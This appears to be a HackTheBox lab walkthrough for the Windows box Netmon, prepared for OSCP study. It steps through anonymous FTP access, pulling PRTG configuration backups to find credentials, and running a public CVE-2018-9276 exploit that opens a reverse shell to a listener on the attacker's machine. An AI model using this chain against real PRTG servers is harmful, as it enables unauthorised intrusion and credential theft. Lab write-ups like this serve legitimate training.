## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)

## 🧰 Tools Used

- `nmap`
- `ftp`
- `wget`
- `grep`
- Web browser (for accessing PRTG Network Monitor login)
- Exploit from GitHub: [A1vinSmith/CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276)
- Python3 (to run the CVE-2018-9276 exploit)

---

## 💻 Commands (In Order)

### 🔍 Recon
```bash
sudo nmap -A 10.10.10.152 -p-
```

### 📂 [FTP](FTP.md) Enumeration
```bash
ftp 10.10.10.152
# Login as anonymous
# Navigate and find user.txt
```

### ⚠️ [SMB](SMB.md) Enumeration Attempt
```bash
# Attempted but failed without credentials
```

### 🌐 [Web Enumeration](HTTP)
```text
# Visit http://10.10.10.152 and observe PRTG login page
# Try default creds: prtgadmin:prtgadmin (fails)
```

### 🔍 Find Stored PRTG Credentials
```bash
# Go back to FTP and look under:
ftp> cd /ProgramData/Paessler
ftp> ls

# Exit FTP and download recursively:
wget -r ftp://10.10.10.152/ProgramData/Paessler
```

### 🔎 Search Downloaded Configs for Passwords
```bash
grep -r -l 'password' PRTG\ Network\ Monitor 2>/dev/null
# Find PRTG Configuration.old.bak
```

### 🧠 Critical Thinking: Try Common Variation
```text
# Use password: PrTg@dmin2019
# Login successfully to PRTG web interface
```

### 📡 Exploitation: CVE-2018-9276
```bash
# Clone or download exploit:
git clone https://github.com/A1vinSmith/CVE-2018-9276.git
cd CVE-2018-9276

# Run the exploit script (Python 3):
python3 exploit.py -t 10.10.10.152 -u prtgadmin -p 'PrTg@dmin2019' -l 10.10.14.X -P 4444

# On attacker box, setup listener:
nc -lvnp 4444
```

---

Let me know if you want this turned into a Markdown template or a printable cheatsheet! 🛠️📄